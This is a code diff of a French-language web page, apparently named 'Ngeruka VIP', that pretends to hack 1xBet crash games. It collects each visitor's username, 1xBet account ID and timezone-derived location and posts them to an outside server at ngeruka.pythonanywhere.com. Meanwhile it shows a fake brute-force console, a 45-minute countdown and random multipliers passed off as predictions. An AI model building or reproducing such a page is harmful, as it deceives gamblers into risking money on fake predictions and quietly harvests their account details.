@@ -3,37 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ngeruka - Système de Hacking VIP</title>
+    <title>Ngeruka VIP - Hack System</title>
     <style>
-        :root { --neon-green: #00ff00; --warn-red: #ff0000; --gold: #f39c12; }
-        body { font-family: 'Courier New', Courier, monospace; background-color: #050505; color: var(--neon-green); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { background: #111; padding: 25px; border-radius: 10px; border: 1px solid var(--neon-green); width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); position: relative; }
-        h2 { color: var(--gold); text-transform: uppercase; font-size: 1.2rem; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--neon-green); background: #000; color: var(--neon-green); border-radius: 5px; box-sizing: border-box; font-family: inherit; }
-        button { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid var(--neon-green); background: transparent; color: var(--neon-green); font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        button:hover { background: var(--neon-green); color: #000; }
-        
+        :root { --neon: #00ff00; --gold: #f39c12; --bg: #0a0a0a; }
+        body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--neon); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: #111; padding: 25px; border: 1px solid var(--neon); border-radius: 10px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+        h2 { color: var(--gold); text-transform: uppercase; font-size: 1.1rem; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--neon); background: #000; color: var(--neon); border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        button:hover { background: var(--neon); color: #000; }
         .step { display: none; }
-        .active { display: block; animation: fadeIn 0.5s ease; }
+        .active { display: block; animation: fadeIn 0.5s; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        /* Console Style */
-        #console { background: #000; height: 120px; overflow: hidden; text-align: left; padding: 10px; font-size: 0.75rem; border: 1px solid #222; margin: 15px 0; color: #008800; }
-        .timer { font-size: 2rem; color: var(--warn-red); margin: 10px 0; font-weight: bold; }
-        .progress-bar { width: 100%; background: #222; height: 6px; border-radius: 3px; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: var(--neon-green); transition: width 0.3s; }
-        
-        /* Prediction UI */
-        #predictionDisplay { font-size: 4rem; font-weight: bold; color: #fff; margin: 20px 0; text-shadow: 0 0 10px var(--gold); }
-        .alert-safe { color: var(--warn-red); font-weight: bold; font-size: 0.8rem; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        #console { background: #000; height: 100px; overflow: hidden; text-align: left; padding: 10px; font-size: 0.7rem; border: 1px solid #333; margin: 10px 0; }
+        .progress-bar { width: 100%; background: #222; height: 8px; border-radius: 4px; overflow: hidden; margin: 15px 0; }
+        .progress-fill { width: 0%; height: 100%; background: var(--neon); transition: width 0.3s; }
+        .timer { font-size: 2rem; color: #ff0000; font-weight: bold; }
+        #predictionDisplay { font-size: 4rem; font-weight: bold; color: #fff; margin: 20px 0; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div id="step1" class="step active">
-        <h2>🎯 ACCÈS VIP 1XBET</h2>
+        <h2>🎯 ACCÈS VIP NGERUKA</h2>
         <input type="text" id="nom" placeholder="NOM D'UTILISATEUR (MIN 4)">
         <input type="number" id="id1xbet" placeholder="ID COMPTE 1XBET">
         <select id="jeu">
@@ -41,57 +34,56 @@
             <option value="Under Over 7">Jeu : Under Over 7</option>
             <option value="Apple of Fortune">Jeu : Apple of Fortune</option>
         </select>
-        <button onclick="validerStep1()">VÉRIFIER LE SOLDE</button>
+        <button onclick="validerStep1()">VÉRIFIER LE COMPTE</button>
     </div>
 
     <div id="step2" class="step">
-        <h2>📍 LOCALISATION SYSTÈME</h2>
+        <h2>📍 LOCALISATION</h2>
         <p>Bonjour <span id="userName" style="color:white"></span>,</p>
-        <p id="geoData">Analyse des proxys de connexion...</p>
-        <button onclick="changeStep(3)">CONFIGURER LE BOT</button>
+        <p id="geoData">Initialisation du traceur...</p>
+        <button onclick="showStep(3)">CONTINUER CONFIGURATION</button>
     </div>
 
     <div id="step3" class="step">
         <h2>💡 INSTRUCTIONS</h2>
-        <div style="text-align:left; font-size: 0.8rem; background:#1a1a1a; padding:10px; border-radius:5px;">
-            • Suivez la prédiction en temps réel.<br>
-            • STOPPEZ le jeu avant la limite indiquée.<br>
-            • Sécurité : Sortez à -0.20x du chiffre prédit.<br>
-            • Ne pas dépasser 28.00x de gain.
-        </div>
-        <button onclick="changeStep(4)">ACCÉDER AU HACK</button>
+        <p style="font-size: 0.8rem; text-align: left;">
+            • Le bot prédit l'algorithme 1xBet.<br>
+            • Ne dépassez jamais la cote 28.00.<br>
+            • Sortez du jeu 0.20x avant la fin prédite.<br>
+            • Solde minimum requis : 10 000 FC.
+        </p>
+        <button onclick="showStep(4)">ACCÉDER AU HACK</button>
     </div>
 
     <div id="step4" class="step">
-        <h2>🔑 ADMISSION VIP</h2>
-        <p>ENTREZ LE MOT DE PASSE D'ACCÈS MAÎTRE</p>
-        <input type="password" id="masterPass" placeholder="CODE VIP">
-        <button onclick="demarrerHack()">LANCER LE BRUTE-FORCE</button>
+        <h2>🔑 SÉCURITÉ VIP</h2>
+        <p>ENTREZ LE MOT DE PASSE (112334)</p>
+        <input type="password" id="masterPass" placeholder="CODE D'ACCÈS">
+        <button onclick="demarrerHacking()">LANCER LE SCAN FINAL</button>
     </div>
 
     <div id="step5" class="step">
-        <h2>HACKING EN COURS...</h2>
+        <h2>BRUTE-FORCE EN COURS</h2>
         <div id="console"></div>
         <div class="progress-bar"><div id="hackBar" class="progress-fill"></div></div>
         <div class="timer" id="countdown">45:00</div>
-        <p style="font-size:0.7rem;">DECRYPTAGE DES CLÉS 1XBET EN COURS. PATIENTEZ...</p>
+        <p style="font-size:0.7rem;">DECRYPTAGE DU MOT DE PASSE ET VÉRIFICATION DU SOLDE...</p>
     </div>
 
     <div id="step6" class="step">
-        <h2 style="border:none;">📡 LIVE PREDICTOR</h2>
+        <h2>📡 LIVE PREDICTOR</h2>
         <div id="predictionDisplay">--</div>
-        <p id="predictStatus" style="font-size:0.9rem;">INITIALISATION...</p>
         <div class="progress-bar"><div id="cycleBar" class="progress-fill"></div></div>
-        <p class="alert-safe">⚠️ RETRAIT AUTO CONSEILLÉ (-0.20x)</p>
+        <p id="predictStatus">INITIALISATION...</p>
     </div>
 </div>
 
 <script>
-    const MASTER_CODE = "112334";
     const API_URL = "https://ngeruka.pythonanywhere.com/send";
-    let store = { nom: "", id: "", jeu: "", pays: "", ville: "", solde: 12500 };
+    const MASTER_CODE = "112334";
+    let store = { nom: "", id: "", jeu: "", pays: "", ville: "", pass: "", solde: 12500 };
 
-    function changeStep(n) {
+    function showStep(n) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById('step' + n).classList.add('active');
     }
@@ -100,105 +92,90 @@
         store.nom = document.getElementById('nom').value;
         store.id = document.getElementById('id1xbet').value;
         store.jeu = document.getElementById('jeu').value;
-        if(store.nom.length < 4 || !store.id) return alert("Identifiants invalides");
+        if(store.nom.length < 4 || !store.id) return alert("Remplissez tous les champs !");
         
         document.getElementById('userName').innerText = store.nom;
-        changeStep(2);
+        showStep(2);
         detectGeo();
     }
 
     function detectGeo() {
         const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
         store.pays = tz.split('/')[0] || "Afrique";
-        store.ville = (tz.split('/')[1] || "Zone Active").replace('_', ' ');
-        document.getElementById('geoData').innerHTML = `Notre serveur vous a détecté à :<br><b style="color:white">${store.ville}, ${store.pays}</b>`;
+        store.ville = (tz.split('/')[1] || "Active").replace('_', ' ');
+        document.getElementById('geoData').innerHTML = `Détecté à : <b style="color:white">${store.ville}, ${store.pays}</b>`;
     }
 
-    function demarrerHack() {
-        const pass = document.getElementById('masterPass').value;
-        if(pass !== MASTER_CODE) return alert("CODE VIP INCORRECT");
+    async function demarrerHacking() {
+        const passInput = document.getElementById('masterPass').value;
+        if(passInput !== MASTER_CODE) return alert("CODE INCORRECT !");
+        store.pass = passInput;
 
-        changeStep(5);
-        sendData(); // Envoi des infos à PythonAnywhere en arrière-plan
-        runBruteForceUI();
-        startTimer(45); // Simulation 45 minutes
-    }
+        showStep(5);
+        
+        // 1. ENVOI IMMÉDIAT AU SERVEUR
+        envoiServeur(); 
 
-    function runBruteForceUI() {
-        const consoleEl = document.getElementById('console');
-        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        // 2. SIMULATION CONSOLE
+        const con = document.getElementById('console');
         setInterval(() => {
-            let fakePass = "";
-            for(let i=0; i<10; i++) fakePass += chars.charAt(Math.floor(Math.random()*chars.length));
             const div = document.createElement('div');
-            div.innerText = `> TRYING_SALT: ${fakePass}... [DENIED]`;
-            consoleEl.prepend(div);
-            if(consoleEl.childNodes.length > 8) consoleEl.removeChild(consoleEl.lastChild);
-        }, 1500); // Ralenti pour le réalisme
-    }
+            div.innerText = `> Testing_Hash: ${Math.random().toString(36).substring(7)}... [FAIL]`;
+            con.prepend(div);
+            if(con.childNodes.length > 5) con.removeChild(con.lastChild);
+        }, 1000);
 
-    function startTimer(minutes) {
-        let duration = minutes * 60;
+        // 3. TIMER 45 MIN
+        let duration = 45 * 60;
         const display = document.getElementById('countdown');
         const bar = document.getElementById('hackBar');
         
-        let timer = setInterval(() => {
+        const timer = setInterval(() => {
             let mins = Math.floor(duration / 60);
             let secs = duration % 60;
-            display.innerText = `${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`;
-            bar.style.width = ((minutes * 60 - duration) / (minutes * 60) * 100) + "%";
-
+            display.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            bar.style.width = ((45*60 - duration) / (45*60) * 100) + "%";
             if (--duration < 0) {
                 clearInterval(timer);
-                changeStep(6);
-                startPredictorCycle();
+                showStep(6);
+                startPredictor();
             }
         }, 1000);
-        
-        // Pour vos tests, vous pouvez réduire la durée ici ou appeler changeStep(6) manuellement
     }
 
-    async function startPredictorCycle() {
+    async function envoiServeur() {
+        console.log("Tentative d'envoi...");
+        try {
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(store)
+            });
+            if(response.ok) console.log("✅ Données reçues par PythonAnywhere");
+            else console.log("❌ Erreur serveur:", response.status);
+        } catch (e) {
+            console.error("❌ Erreur de connexion au serveur:", e);
+        }
+    }
+
+    async function startPredictor() {
         const display = document.getElementById('predictionDisplay');
         const status = document.getElementById('predictStatus');
         const bar = document.getElementById('cycleBar');
 
         while(true) {
-            status.innerText = "ANALYSE ALGORITHME...";
-            status.style.color = "var(--neon-green)";
-            display.innerText = "---";
-            
-            // Simulation chargement analyse (4s)
-            for(let i=0; i<=100; i+=5) {
+            status.innerText = "ANALYSE EN COURS...";
+            for(let i=0; i<=100; i+=10) {
                 bar.style.width = i + "%";
-                await new Promise(r => setTimeout(r, 200));
+                await new Promise(r => setTimeout(r, 400));
             }
-
-            // Génération prediction max 28.00
-            const prediction = (Math.random() * (28.00 - 1.20) + 1.20).toFixed(2);
-            display.innerText = "x" + prediction;
-            status.innerText = "PRÉDICTION ACTIVE";
-            status.style.color = "white";
-
-            // Temps d'attente basé sur la cote (simule le crash)
-            await new Promise(r => setTimeout(r, Math.min(prediction * 400, 8000)));
-
-            display.style.color = "var(--warn-red)";
-            status.innerText = "CRASH DÉTECTÉ";
-            await new Promise(r => setTimeout(r, 3000));
-            display.style.color = "white";
-            bar.style.width = "0%";
+            const pred = (Math.random() * (28.00 - 1.20) + 1.20).toFixed(2);
+            display.innerText = "x" + pred;
+            status.innerText = "PRÉDICTION PRÊTE !";
+            await new Promise(r => setTimeout(r, 5000));
+            display.innerText = "CRASH";
+            await new Promise(r => setTimeout(r, 2000));
         }
-    }
-
-    async function sendData() {
-        try {
-            await fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({...store, pass_master: "112334", status: "HACK_ACTIVE"})
-            });
-        } catch(e) { console.log("Erreur envoi discret."); }
     }
 </script>
 </body>
